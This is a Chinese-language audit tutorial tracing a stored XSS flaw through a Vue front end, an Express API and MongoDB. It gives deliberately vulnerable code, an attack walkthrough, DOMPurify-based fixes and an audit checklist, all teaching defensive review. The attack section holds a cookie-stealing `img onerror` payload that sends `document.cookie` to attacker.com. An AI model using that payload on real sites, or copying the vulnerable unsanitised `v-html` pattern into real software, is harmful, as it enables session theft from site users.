# 案例研究：JavaScript 中的评论系统 XSS 漏洞链路分析

> **难度等级：** ★★★★☆ (中高级)
> **审计时间：** 60-90 分钟 (完整链路分析)
> **适用场景：** 前后端分离的 SPA 应用中的评论/讨论功能

## 场景概述

这是一个包含 **反射型 XSS** 和 **存储型 XSS** 的综合案例。学习本案例后，你将理解：

1. 如何在前后端分离的架构中追踪 XSS 漏洞
2. 多个防护点失效导致漏洞的完整链路
3. 如何分析 API、前端、后端之间的数据流

---

## 系统架构

```
用户输入 (评论文本)
  ↓
[前端 Vue 组件] → 验证、过滤
  ↓
[HTTP POST /api/comments]
  ↓
[Node.js Express 后端] → 保存到数据库
  ↓
[MongoDB 数据库]
  ↓
[HTTP GET /api/comments/:id]  ← 用户访问评论页面时
  ↓
[前端 Vue 显示评论]
  ↓
[浏览器中执行脚本]  ← XSS 触发点
```

---

## 完整的漏洞代码示例

### 第 1 步：前端提交评论（Vue 组件）

**文件：`src/components/CommentForm.vue`**

```vue
<template>
  <div class="comment-form">
    <textarea v-model="comment" placeholder="说点什么..."></textarea>
    <button @click="submitComment">提交</button>
  </div>
</template>

<script>
export default {
  data() {
    return {
      comment: ''
    };
  },
  methods: {
    async submitComment() {
      // ⚠️ 问题 1：前端"尝试"验证，但验证不完整
      if (this.comment.length > 5 && !this.comment.includes('<script>')) {
        const response = await fetch('/api/comments', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ text: this.comment })
        });
        if (response.ok) {
          this.comment = '';
          this.$emit('comment-added');
        }
      }
    }
  }
};
</script>
```

**漏洞分析：**
- ✅ 在 Vue 模板中使用 `{{ comment }}` 时会自动转义（安全）
- ❌ 但发送到后端时是原始文本，检查仅排除了 `<script>` 但不排除 `<img onerror>`
- ❌ 前端验证可以被绕过（F12 修改代码）

### 第 2 步：后端接收和保存（Express.js）

**文件：`backend/routes/comments.js`**

```javascript
const express = require('express');
const router = express.Router();
const Comment = require('../models/Comment');

// POST /api/comments
router.post('/comments', async (req, res) => {
  const { text } = req.body;

  // ⚠️ 问题 2：后端没有验证或净化
  // 直接保存用户输入到数据库
  const comment = new Comment({
    text: text,  // ❌ 直接保存未净化的内容
    author: req.user.id,
    createdAt: new Date()
  });

  await comment.save();
  res.json({ success: true, comment });
});

// GET /api/comments/:id
router.get('/comments/:id', async (req, res) => {
  const comment = await Comment.findById(req.params.id);
  // ⚠️ 问题 3：API 返回原始数据，未进行任何处理
  res.json(comment);
});

module.exports = router;
```

**漏洞分析：**
- ❌ 没有使用 DOMPurify 或 HTML Purifier 净化
- ❌ 没有验证用户输入
- ❌ 直接返回数据库中的原始内容

### 第 3 步：前端显示评论（Vue 组件）

**文件：`src/components/CommentList.vue`**

```vue
<template>
  <div class="comment-list">
    <div v-for="comment in comments" :key="comment.id" class="comment-item">
      <div class="comment-author">{{ comment.author }}</div>
      <!-- ⚠️ 问题 4：使用 v-html 但未净化 -->
      <div v-html="comment.text" class="comment-text"></div>
      <div class="comment-time">{{ formatTime(comment.createdAt) }}</div>
    </div>
  </div>
</template>

<script>
export default {
  props: ['postId'],
  data() {
    return {
      comments: []
    };
  },
  async mounted() {
    const response = await fetch(`/api/comments/${this.postId}`);
    this.comments = await response.json();
    // ⚠️ 问题 5：直接使用 API 返回的数据，未进行任何处理
  },
  methods: {
    formatTime(timestamp) {
      return new Date(timestamp).toLocaleString();
    }
  }
};
</script>
```

**漏洞分析：**
- ❌ 使用 `v-html` 直接渲染评论文本，绕过了 Vue 的自动转义
- ❌ 从 API 获取数据后直接使用，没有前端验证或净化

---

## 完整的攻击链路

### 攻击步骤

1. **攻击者提交恶意评论**
   ```
   评论文本：<img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">
   ```

2. **绕过前端验证**
   - 前端检查：`!this.comment.includes('<script>')` ✓ 通过（因为使用了 `<img>` 而不是 `<script>`）
   - 评论被发送到后端

3. **后端保存未净化的数据**
   ```javascript
   // 原始保存在数据库中
   {
     text: "<img src=x onerror=\"fetch('http://attacker.com/steal?cookie='+document.cookie)\">"
   }
   ```

4. **用户访问评论**
   - 前端获取评论：`GET /api/comments/123`
   - API 返回原始数据（包含 `<img onerror>`）

5. **XSS 触发**
   - Vue 组件使用 `v-html` 渲染：`<div v-html="comment.text"></div>`
   - 浏览器解析并执行 `onerror` 事件
   - 攻击者获取用户的 Cookie

---

## 审计过程演示（L4 级别）

### 第 1 步：识别风险操作

**搜索关键词：** `v-html`, `innerHTML`, `dangerouslySetInnerHTML`

找到的代码：
```vue
<div v-html="comment.text" class="comment-text"></div>
```

**初步判断：** L2-L3（使用了危险操作）

### 第 2 步：追踪数据来源

问题：`comment.text` 来自哪里？

```vue
<script>
  async mounted() {
    const response = await fetch(`/api/comments/${this.postId}`);
    this.comments = await response.json();  // ← 来自 API
  }
</script>
```

**跟进：** 需要检查 API `/api/comments/:id` 的实现

### 第 3 步：检查后端 API

```javascript
router.get('/comments/:id', async (req, res) => {
  const comment = await Comment.findById(req.params.id);
  res.json(comment);  // ← 直接返回数据库数据
});
```

**跟进：** 数据来自数据库，需要检查数据如何进入数据库

### 第 4 步：检查数据输入来源

```javascript
router.post('/comments', async (req, res) => {
  const { text } = req.body;
  const comment = new Comment({ text: text });  // ← 直接保存
  await comment.save();
});
```

**跟进：** 数据来自用户请求，需要检查前端如何提交

### 第 5 步：检查前端提交代码

```vue
<script>
  methods: {
    async submitComment() {
      if (this.comment.length > 5 && !this.comment.includes('<script>')) {
        // ← 验证不完整
        const response = await fetch('/api/comments', {
          method: 'POST',
          body: JSON.stringify({ text: this.comment })
        });
      }
    }
  }
</script>
```

**完整链路分析：**

```
[前端用户输入]
  ↓ (带有 <img onerror>)
[前端验证] (仅检查 <script>，未检查其他)
  ↓ (通过)
[API /api/comments POST]
  ↓
[后端接收] (无验证，直接保存)
  ↓
[MongoDB 存储]
  ↓
[用户访问评论]
  ↓
[API /api/comments/:id] (返回原始数据)
  ↓
[前端接收]
  ↓
[v-html 渲染] (XSS 触发！)
  ↓
[浏览器执行脚本]
```

### 审计判断

**等级：L4（跨模块追踪）**
- 涉及前端（Vue）、后端（Express）、数据库（MongoDB）
- 数据流跨越多个系统边界
- 每个环节都有防护缺陷

**风险：高风险 - 确认漏洞**
- 多层防护都失效
- 可直接执行任意 JavaScript

---

## 修复方案

### 方案 1：前端修复（快速但不完整）

**推荐指数：** ⭐ (不推荐单独使用)

```vue
<script>
import DOMPurify from 'dompurify';

export default {
  data() {
    return { comments: [] };
  },
  async mounted() {
    const response = await fetch(`/api/comments/${this.postId}`);
    const data = await response.json();
    // 在使用前净化
    this.comments = data.map(c => ({
      ...c,
      text: DOMPurify.sanitize(c.text, { ALLOWED_TAGS: ['b', 'i', 'p'] })
    }));
  }
};
</script>

<template>
  <div v-html="comment.text" v-for="comment in comments" :key="comment.id"></div>
</template>
```

**优点：** 简单，快速修复
**缺点：** 后端仍然保存原始数据，其他前端或 API 消费者可能仍然容易受攻击

### 方案 2：后端修复（推荐）

**推荐指数：** ⭐⭐⭐⭐⭐ (最推荐)

```javascript
const DOMPurify = require('isomorphic-dompurify');

router.post('/comments', async (req, res) => {
  let { text } = req.body;

  // 1. 验证：检查长度和类型
  if (!text || typeof text !== 'string' || text.length > 5000) {
    return res.status(400).json({ error: 'Invalid text' });
  }

  // 2. 净化：移除危险标签和属性
  const clean = DOMPurify.sanitize(text, {
    ALLOWED_TAGS: ['b', 'i', 'strong', 'em', 'p', 'br'],
    ALLOWED_ATTR: []  // 不允许任何属性
  });

  // 3. 保存净化后的内容
  const comment = new Comment({
    text: clean,  // ✅ 保存已净化的内容
    author: req.user.id
  });

  await comment.save();
  res.json({ success: true, comment });
});
```

**优点：**
- 所有消费方（前端、移动端、第三方 API）都受保护
- 数据库中的数据已是安全的
- 防御纵深完整

**缺点：** 无重大缺点，推荐使用

### 方案 3：完整防护（最安全）

**推荐指数：** ⭐⭐⭐⭐⭐ (生产环境推荐)

```javascript
// 后端：保存原始数据，提供已净化的数据
router.post('/comments', async (req, res) => {
  const { text } = req.body;
  // ... 验证 ...
  const clean = DOMPurify.sanitize(text);

  const comment = new Comment({
    text_raw: text,        // 保存原始（用于日志、审计）
    text_clean: clean      // 保存已净化（用于展示）
  });
  await comment.save();
});

router.get('/comments/:id', async (req, res) => {
  const comment = await Comment.findById(req.params.id);
  // 仅返回已净化的版本
  res.json({
    id: comment.id,
    text: comment.text_clean,  // ✅ 使用净化版本
    author: comment.author
  });
});

// 前端：额外的防护（防御纵深）
<script>
import DOMPurify from 'dompurify';
async mounted() {
  const response = await fetch(`/api/comments/${this.postId}`);
  const comments = await response.json();
  // 再次净化（防御 API 被攻击）
  this.comments = comments.map(c => ({
    ...c,
    text: DOMPurify.sanitize(c.text)
  }));
}
</script>
```

---

## 学习要点总结

### ✅ 正确的做法

1. **前端验证** → 不是安全机制，仅用于 UX
2. **后端净化** → 必须做，使用成熟库（DOMPurify、HTML Purifier）
3. **数据库存储** → 存储已净化的版本
4. **API 返回** → 仅返回安全的数据
5. **前端使用** → 仍然谨慎对待，实施防御纵深

### ❌ 常见的错误

1. ❌ 仅在前端验证（可被绕过）
2. ❌ 依赖前端净化（其他消费方无保护）
3. ❌ 在数据库存储原始数据（修改困难）
4. ❌ 相信"API 返回的数据是安全的"（API 可能被攻击）
5. ❌ 使用 `v-html`/`innerHTML` 而不净化

---

## 审计检查清单

在分析类似的系统时，使用此清单：

- [ ] 是否存在 `v-html`、`innerHTML`、`dangerouslySetInnerHTML` 等危险操作？
- [ ] 这些操作的输入来自哪里？（追踪回源）
- [ ] 在输入点是否有验证？
- [ ] 在输出点是否有净化？
- [ ] 是否有多个防护层？
- [ ] 前端和后端的防护是否独立？
- [ ] API 返回的数据是否已经过净化？
- [ ] 数据库中存储的是原始数据还是净化数据？
- [ ] 是否存在其他输出方式（日志、报告、导出等）？

